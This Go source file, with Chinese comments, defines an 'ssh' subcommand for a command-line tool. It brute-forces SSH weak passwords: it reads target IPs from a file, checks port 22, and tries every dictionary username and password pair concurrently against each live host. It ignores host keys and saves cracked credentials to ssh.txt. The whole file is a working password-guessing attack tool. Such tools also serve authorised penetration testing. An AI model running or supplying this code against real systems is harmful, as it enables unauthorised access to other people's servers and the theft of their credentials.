package cmd

import (
	"bufio"
	"demo/config"
	"demo/pkg/logger"
	"flag"
	"fmt"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net"
	"os"
	"sync"
	"time"
)

// sshCmd represents the ssh command
var sshCmd = &cobra.Command{
	Use:   "ssh",
	Short: "ssh弱口令爆破账户/密码",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("\033[1;31;40m%s\033[0m\n", "正在进行ssh弱口令爆破...")
		flag.Parse()
		start := time.Now()

		var aliveIps []string
		// 依次读取文件进入切片
		file, _ := os.Open("./outputip.txt")
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()
			SurvivalHost = append(SurvivalHost, line)
		}
		for _, ip := range SurvivalHost {
			if sshcheckAlive(ip) {
				aliveIps = append(aliveIps, ip)
			} else {
				fmt.Printf(ip + ":22端口没打开"+"\n")
			}
		}
		// 输出相关端口打开的ip
		for _, ips := range aliveIps {
			fmt.Printf(ips + ":22端口打开-------"+"\n")
		}

		users := config.Userdict["ssh"]
		passwords := config.Passwords

		var wg sync.WaitGroup
		results := make(chan string)

		// 处理结果的协程
		go func() {
			for res := range results {
				fmt.Println(logger.LightBlue(res))       //打印在终端结果
			}
		}()

		// 创建协程进行爆破
		for _, user := range users {
			for _, password := range passwords {
				for _, ip := range aliveIps {
					wg.Add(1)
					go func(ip, user, password string) {
						defer wg.Done()
						success, _ := sshLogin(ip, user, password)
						if success {
							result := fmt.Sprintf("破解%v成功，user:%v,password:%v", ip, user, password)
							results <- result
							result123 := fmt.Sprintf("ip:%v,user:%v,pwd:%v,", ip, user, password)
							if err := ioutil.WriteFile("ssh.txt", []byte(result123), 0644); err != nil {
								fmt.Println("写入文件时出错:", err)
								return
							}
						} else {
							fmt.Printf("破解%v失败，用户名是%v,密码是%v\n", ip, user, password)
						}
					}(ip, user, password)
				}
			}
		}

		// 等待所有协程完成
		wg.Wait()
		close(results)
		// 判断是否所有 IP 都已经爆破完成
		fmt.Println("爆破已完成")
		println(len(aliveIps))

		defer func() {
			elapsed := time.Since(start)
			fmt.Println(elapsed)
		}()
	},
}

func init() {
	rootCmd.AddCommand(sshCmd)
	sshCmd.Flags().StringVarP(&Hosts, "hosts", "H", "", "设置你要ssh弱口令爆破的主机")
}

func sshcheckAlive(ip string) bool {
	alive := false
	_, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, "22"), 200*time.Millisecond)
	if err == nil {
		alive = true
	}
	return alive
}

func sshLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         1 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo '123'")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}
